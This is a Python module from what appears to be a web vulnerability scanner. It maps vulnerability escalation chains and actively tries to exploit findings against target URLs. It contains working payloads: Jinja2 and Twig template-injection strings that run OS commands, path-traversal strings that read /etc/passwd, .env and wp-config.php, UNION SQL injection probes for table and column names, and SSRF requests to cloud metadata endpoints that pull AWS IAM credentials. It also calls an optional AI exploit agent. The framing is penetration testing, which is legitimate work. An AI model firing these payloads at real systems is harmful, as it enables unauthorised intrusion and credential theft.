"""
cyberm4fia-scanner - Vulnerability Chaining & Escalation Engine
Analyzes findings, builds attack paths, and ACTIVELY TESTS escalations.

Inspired by Revelion's "Proves It, Doesn't Just Flag It" philosophy.
When a vuln is found, the engine tries to escalate it:
  SSTI → Can I get RCE?
  LFI  → Can I read /etc/passwd or .env?
  SQLi → Can I extract data?
  XSS  → Can I steal cookies (no HttpOnly)?
"""

import re
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from utils.colors import log_info, log_success, log_warning
from utils.request import ScanExceptions, smart_request

# ─────────────────────────────────────────────────────
# Chain Rules: how vuln A can escalate to vuln B
# ─────────────────────────────────────────────────────
CHAIN_RULES = [
    {
        "from": "SSRF",
        "to": "Cloud Metadata Access",
        "condition": lambda v: (
            "169.254" in v.get("payload", "")
            or "metadata" in v.get("payload", "").lower()
        ),
        "description": "SSRF can reach cloud metadata (169.254.169.254) to steal IAM credentials",
        "severity": "CRITICAL",
    },
    {
        "from": "SSRF",
        "to": "Internal Port Scan",
        "condition": lambda v: True,
        "description": "SSRF allows scanning internal network ports (127.0.0.1, 10.x, 192.168.x)",
        "severity": "HIGH",
    },
    {
        "from": "SSRF",
        "to": "SQLi (Internal)",
        "condition": lambda v: True,
        "description": "SSRF → access internal DB admin panels (phpMyAdmin, Adminer) → SQLi",
        "severity": "CRITICAL",
    },
    {
        "from": "SQLi",
        "to": "Data Exfiltration",
        "condition": lambda v: (
            "union" in v.get("payload", "").lower()
            or "blind" in v.get("type", "").lower()
        ),
        "description": "SQL Injection can dump entire database (users, passwords, PII)",
        "severity": "CRITICAL",
    },
    {
        "from": "SQLi",
        "to": "Remote Code Execution",
        "condition": lambda v: True,
        "description": "SQLi → INTO OUTFILE / xp_cmdshell → RCE on database server",
        "severity": "CRITICAL",
    },
    {
        "from": "Command Injection",
        "to": "Remote Code Execution",
        "condition": lambda v: True,
        "description": "Command Injection directly gives OS-level command execution",
        "severity": "CRITICAL",
    },
    {
        "from": "Command Injection",
        "to": "Reverse Shell",
        "condition": lambda v: True,
        "description": "CMDi → spawn reverse shell → full server access",
        "severity": "CRITICAL",
    },
    {
        "from": "LFI",
        "to": "Source Code Disclosure",
        "condition": lambda v: True,
        "description": "LFI can read application source code, config files, credentials",
        "severity": "HIGH",
    },
    {
        "from": "LFI",
        "to": "Remote Code Execution",
        "condition": lambda v: (
            "log" in v.get("payload", "").lower()
            or "proc" in v.get("payload", "").lower()
        ),
        "description": "LFI → Log Poisoning → RCE (inject PHP into access.log, include via LFI)",
        "severity": "CRITICAL",
    },
    {
        "from": "LFI",
        "to": "Credential Theft",
        "condition": lambda v: (
            "passwd" in v.get("payload", "") or "shadow" in v.get("payload", "")
        ),
        "description": "LFI reads /etc/passwd or /etc/shadow → offline password cracking",
        "severity": "CRITICAL",
    },
    {
        "from": "XSS",
        "to": "Session Hijacking",
        "condition": lambda v: True,
        "description": "XSS → steal session cookies → impersonate users/admins",
        "severity": "HIGH",
    },
    {
        "from": "XSS",
        "to": "Account Takeover",
        "condition": lambda v: "stored" in v.get("type", "").lower(),
        "description": "Stored XSS → automatic credential theft from every visitor",
        "severity": "CRITICAL",
    },
    {
        "from": "SSTI",
        "to": "Remote Code Execution",
        "condition": lambda v: True,
        "description": "SSTI (Jinja2/Twig) → direct OS command execution via template sandbox escape",
        "severity": "CRITICAL",
    },
    {
        "from": "XXE",
        "to": "SSRF",
        "condition": lambda v: True,
        "description": "XXE → SSRF via external entity fetching internal URLs",
        "severity": "HIGH",
    },
    {
        "from": "XXE",
        "to": "Credential Theft",
        "condition": lambda v: True,
        "description": "XXE → read /etc/passwd, config files, AWS credentials",
        "severity": "CRITICAL",
    },
    {
        "from": "Open Redirect",
        "to": "OAuth Token Theft",
        "condition": lambda v: (
            "oauth" in v.get("url", "").lower()
            or "callback" in v.get("url", "").lower()
        ),
        "description": "Open Redirect in OAuth flow → steal authorization code/token",
        "severity": "HIGH",
    },
    {
        "from": "Open Redirect",
        "to": "Phishing",
        "condition": lambda v: True,
        "description": "Open Redirect → redirect users to attacker-controlled phishing page",
        "severity": "MEDIUM",
    },
    {
        "from": "Default Credentials",
        "to": "Full System Access",
        "condition": lambda v: v.get("service", "").lower() in ("ssh", "rdp"),
        "description": "Default SSH/RDP credentials → full OS-level access",
        "severity": "CRITICAL",
    },
    {
        "from": "Default Credentials",
        "to": "Data Exfiltration",
        "condition": lambda v: (
            v.get("service", "").lower() in ("mysql", "postgresql", "mongodb", "redis")
        ),
        "description": "Default DB credentials → dump all data",
        "severity": "CRITICAL",
    },
    {
        "from": "cloud_bucket",
        "to": "Data Breach",
        "condition": lambda v: v.get("access") in ("PUBLIC_LIST", "PUBLIC_WRITE"),
        "description": "Open cloud bucket → access/modify stored data (PII, backups, configs)",
        "severity": "CRITICAL",
    },
    {
        "from": "subdomain_takeover",
        "to": "Phishing / Cookie Theft",
        "condition": lambda v: True,
        "description": "Subdomain takeover → host malicious content on trusted domain → steal cookies",
        "severity": "HIGH",
    },
]

def analyze_chains(vulnerabilities):
    """
    Analyze a list of vulnerabilities and find potential attack chains.
    Returns a list of attack paths.
    """
    if not vulnerabilities:
        return []

    log_info(f"Analyzing {len(vulnerabilities)} finding(s) for attack chains...")

    chains = []
    vuln_types = set()

    for vuln in vulnerabilities:
        vtype = vuln.get("type", "Unknown")
        vuln_types.add(vtype)

    for vuln in vulnerabilities:
        vtype = vuln.get("type", "Unknown")

        for rule in CHAIN_RULES:
            # Match vulnerability type to chain rule
            if rule["from"].lower() in vtype.lower():
                try:
                    if rule["condition"](vuln):
                        chain = {
                            "source_vuln": vtype,
                            "source_url": vuln.get("url", "N/A"),
                            "source_payload": vuln.get("payload", "N/A"),
                            "escalation": rule["to"],
                            "description": rule["description"],
                            "severity": rule["severity"],
                            "chain": f"{vtype} → {rule['to']}",
                        }
                        chains.append(chain)
                except ScanExceptions:
                    pass

    # Build multi-step chains
    multi_chains = []
    for c1 in chains:
        for c2 in chains:
            if c1["escalation"].lower() in c2["source_vuln"].lower() and c1 != c2:
                multi_chain = {
                    "chain": f"{c1['source_vuln']} → {c1['escalation']} → {c2['escalation']}",
                    "severity": "CRITICAL",
                    "description": f"{c1['description']} THEN {c2['description']}",
                    "steps": [c1, c2],
                }
                multi_chains.append(multi_chain)

    chains.extend(multi_chains)

    # Display
    if chains:
        log_success(f"Found {len(chains)} potential attack chain(s):")
        seen = set()
        for chain in chains:
            chain_str = chain["chain"]
            if chain_str not in seen:
                seen.add(chain_str)
                severity = chain["severity"]
                if severity == "CRITICAL":
                    log_warning(f"  🔴 [{severity}] {chain_str}")
                elif severity == "HIGH":
                    log_warning(f"  🟠 [{severity}] {chain_str}")
                else:
                    log_info(f"  🟡 [{severity}] {chain_str}")
                log_info(f"     └─ {chain['description']}")

    # ── AI-Powered Chain Discovery ──
    try:
        from utils.ai_exploit_agent import get_chain_detector
        detector = get_chain_detector()
        if (
            detector.client
            and getattr(detector.client, "available", False)
            and hasattr(detector.client, "generate")
        ):
            ai_chains = detector.detect_chains(vulnerabilities)
            if ai_chains:
                log_success(f"🤖 AI discovered {len(ai_chains)} additional attack chain(s):")
                for ac in ai_chains:
                    chain_name = ac.get("chain_name", "Unknown")
                    sev = ac.get("severity", "High")
                    desc = ac.get("description", "")
                    log_warning(f"  🔴 [{sev}] {chain_name}")
                    if desc:
                        log_info(f"     └─ {desc}")
                    chains.append({
                        "chain": chain_name,
                        "severity": sev,
                        "description": desc,
                        "ai_discovered": True,
                    })
    except ImportError:
        pass

    if not chains:
        log_info("No attack chains identified.")

    return chains


# ─── Active Escalation Engine ───────────────────────────────────────────────
# Revelion-style: "Proves it, doesn't just flag it"


# SSTI → RCE escalation payloads (per template engine)
SSTI_RCE_PAYLOADS = {
    "jinja2": [
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
    ],
    "twig": [
        "{{['id']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    ],
    "generic": [
        "${7*7}",
        "<%= system('id') %>",
        "#{7*7}",
    ],
}

# LFI → Sensitive file read targets
LFI_ESCALATION_FILES = [
    ("../../../../../../etc/passwd", r"root:.*?:0:0:", "Linux passwd file"),
    ("....//....//....//....//etc/passwd", r"root:.*?:0:0:", "Linux passwd (WAF bypass)"),
    ("../../../../../../proc/self/environ", r"(PATH|HOME|USER)=", "Process environment"),
    ("../../../.env", r"(DB_PASSWORD|APP_KEY|SECRET)=", ".env credentials"),
    ("../../../wp-config.php", r"DB_PASSWORD", "WordPress DB credentials"),
    ("../../../config/database.yml", r"password:", "Rails DB config"),
]

# SQLi → Data extraction probes
SQLI_EXTRACTION_PROBES = [
    ("' UNION SELECT NULL,table_name FROM information_schema.tables-- -", r"(users|admin|accounts|customers)", "Table names"),
    ("' UNION SELECT NULL,column_name FROM information_schema.columns-- -", r"(password|email|username|token)", "Column names"),
    ("' UNION SELECT NULL,version()-- -", r"(MySQL|MariaDB|PostgreSQL|\d+\.\d+)", "DB version"),
]


def _try_request(url, param, payload, method="GET"):
    """Send an escalation payload and return the response text."""
    try:
        if method.upper() == "POST":
            resp = smart_request("post", url, data={param: payload}, delay=0.3)
        else:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_url = urlunparse(parsed._replace(query=urlencode(flat)))
            resp = smart_request("get", test_url, delay=0.3)
        return resp.text if resp else ""
    except ScanExceptions:
        return ""


def escalate_ssti(vuln: dict) -> dict | None:
    """Try to escalate SSTI → RCE."""
    url = vuln.get("url", "")
    param = vuln.get("field") or vuln.get("param", "")
    payload = vuln.get("payload", "")
    method = vuln.get("method", "GET")

    if not url or not param:
        return None

    # Detect engine from original payload
    engine = "generic"
    if "{{" in payload and "}}" in payload:
        engine = "jinja2"
    elif "{%" in payload:
        engine = "twig"

    rce_payloads = SSTI_RCE_PAYLOADS.get(engine, SSTI_RCE_PAYLOADS["generic"])

    for rce_payload in rce_payloads:
        body = _try_request(url, param, rce_payload, method)
        if not body:
            continue

        # Check for RCE markers
        rce_markers = [
            (r"uid=\d+\([\w-]+\)", "OS command execution (id)"),
            (r"root:.*?:0:0:", "File read (/etc/passwd)"),
            (r"(www-data|apache|nginx|nobody)", "Webserver user identified"),
        ]
        for pattern, desc in rce_markers:
            match = re.search(pattern, body)
            if match:
                log_success(f"  🔴 ESCALATED: SSTI → RCE confirmed! ({desc})")
                return {
                    "type": "SSTI_RCE_Chain",
                    "severity": "Critical",
                    "url": url,
                    "param": param,
                    "original_vuln": "SSTI",
                    "escalation": "Remote Code Execution",
                    "payload": rce_payload,
                    "evidence": match.group(0),
                    "description": f"SSTI → {desc}",
                    "chain": "SSTI Detection → Expression Evaluation → RCE Chain",
                    "proven": True,
                }
    return None


def escalate_lfi(vuln: dict) -> dict | None:
    """Try to escalate LFI → Sensitive File Read."""
    url = vuln.get("url", "")
    param = vuln.get("field") or vuln.get("param", "")
    method = vuln.get("method", "GET")

    if not url or not param:
        return None

    for lfi_payload, pattern, desc in LFI_ESCALATION_FILES:
        body = _try_request(url, param, lfi_payload, method)
        if not body:
            continue

        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            log_success(f"  🔴 ESCALATED: LFI → {desc} confirmed!")
            return {
                "type": "LFI_FileRead_Chain",
                "severity": "Critical",
                "url": url,
                "param": param,
                "original_vuln": "LFI",
                "escalation": f"Sensitive File Read ({desc})",
                "payload": lfi_payload,
                "evidence": match.group(0),
                "description": f"LFI → {desc}",
                "chain": f"Path Traversal → File System Access → {desc}",
                "proven": True,
            }
    return None


def escalate_sqli(vuln: dict) -> dict | None:
    """Try to escalate SQLi → Data Extraction."""
    url = vuln.get("url", "")
    param = vuln.get("field") or vuln.get("param", "")
    method = vuln.get("method", "GET")

    if not url or not param:
        return None

    for sqli_payload, pattern, desc in SQLI_EXTRACTION_PROBES:
        body = _try_request(url, param, sqli_payload, method)
        if not body:
            continue

        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            log_success(f"  🔴 ESCALATED: SQLi → {desc} confirmed!")
            return {
                "type": "SQLi_Extraction_Chain",
                "severity": "Critical",
                "url": url,
                "param": param,
                "original_vuln": "SQLi",
                "escalation": f"Data Extraction ({desc})",
                "payload": sqli_payload,
                "evidence": match.group(0),
                "description": f"SQLi → {desc}",
                "chain": f"SQL Injection → UNION Query → {desc}",
                "proven": True,
            }
    return None


def escalate_xss_cookie(vuln: dict, cookie_vulns: list) -> dict | None:
    """Check if XSS + insecure cookies = session hijack."""
    if not cookie_vulns:
        return None

    # Check if any session cookie lacks HttpOnly
    no_httponly = [
        c for c in cookie_vulns
        if isinstance(c, dict)
        and "httponly" in c.get("issue", "").lower()
    ]

    if no_httponly:
        log_success("  🔴 ESCALATED: XSS + No HttpOnly → Session Hijack possible!")
        return {
            "type": "XSS_SessionHijack_Chain",
            "severity": "Critical",
            "url": vuln.get("url", ""),
            "original_vuln": "XSS",
            "escalation": "Session Hijacking",
            "description": "XSS steals session cookie (no HttpOnly flag) → attacker hijacks session",
            "chain": "XSS Injection → Cookie Theft → Session Hijacking",
            "evidence": f"XSS at {vuln.get('url', '')} + {len(no_httponly)} cookie(s) without HttpOnly",
            "proven": True,
        }
    return None


def escalate_ssrf_cloud(vuln: dict) -> dict | None:
    """Try to escalate SSRF → Cloud Metadata."""
    url = vuln.get("url", "")
    param = vuln.get("field") or vuln.get("param", "")
    method = vuln.get("method", "GET")

    if not url or not param:
        return None

    cloud_targets = [
        ("http://169.254.169.254/latest/meta-data/", r"(ami-id|instance-id|iam)", "AWS Metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", r"(AccessKeyId|SecretAccessKey)", "AWS IAM Credentials"),
        ("http://metadata.google.internal/computeMetadata/v1/", r"(project|instance)", "GCP Metadata"),
    ]

    for target_url, pattern, desc in cloud_targets:
        body = _try_request(url, param, target_url, method)
        if not body:
            continue

        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            log_success(f"  🔴 ESCALATED: SSRF → {desc} confirmed!")
            return {
                "type": "SSRF_CloudMeta_Chain",
                "severity": "Critical",
                "url": url,
                "param": param,
                "original_vuln": "SSRF",
                "escalation": f"Cloud Credential Theft ({desc})",
                "payload": target_url,
                "evidence": match.group(0),
                "description": f"SSRF → {desc}",
                "chain": f"SSRF → Cloud Metadata → {desc}",
                "proven": True,
            }
    return None


# ─── Master Escalation Runner ───────────────────────────────────────────

ESCALATION_MAP = {
    "SSTI": escalate_ssti,
    "LFI": escalate_lfi,
    "SQLi": escalate_sqli,
    "SSRF": escalate_ssrf_cloud,
}


def run_escalations(findings: list) -> list:
    """
    Run active escalation tests on confirmed vulnerabilities.
    Returns a list of proven chain findings.
    
    Called by agent_framework after each scan iteration.
    """
    if not findings:
        return []

    # Only escalate high-confidence findings
    escalatable = [
        f for f in findings
        if isinstance(f, dict)
        and f.get("severity", "").lower() in ("critical", "high")
    ]

    if not escalatable:
        return []

    log_info(f"🔗 Chain Engine: Testing {len(escalatable)} findings for escalation...")
    proven_chains = []

    # Separate cookie findings for XSS chain detection
    cookie_findings = [
        f for f in findings
        if "cookie" in f.get("type", "").lower()
        or "httponly" in f.get("issue", "").lower()
    ]

    for finding in escalatable:
        vtype = finding.get("type", "")

        # Try type-specific escalation
        for vuln_key, escalate_fn in ESCALATION_MAP.items():
            if vuln_key.lower() in vtype.lower():
                try:
                    result = escalate_fn(finding)
                    if result:
                        proven_chains.append(result)
                except ScanExceptions:
                    pass
                break

        # XSS + Cookie chain
        if "xss" in vtype.lower():
            try:
                result = escalate_xss_cookie(finding, cookie_findings)
                if result:
                    proven_chains.append(result)
            except ScanExceptions:
                pass

    if proven_chains:
        log_success(f"🔗 Chain Engine: {len(proven_chains)} escalation(s) PROVEN!")
    else:
        log_info("🔗 Chain Engine: No escalations confirmed.")

    return proven_chains
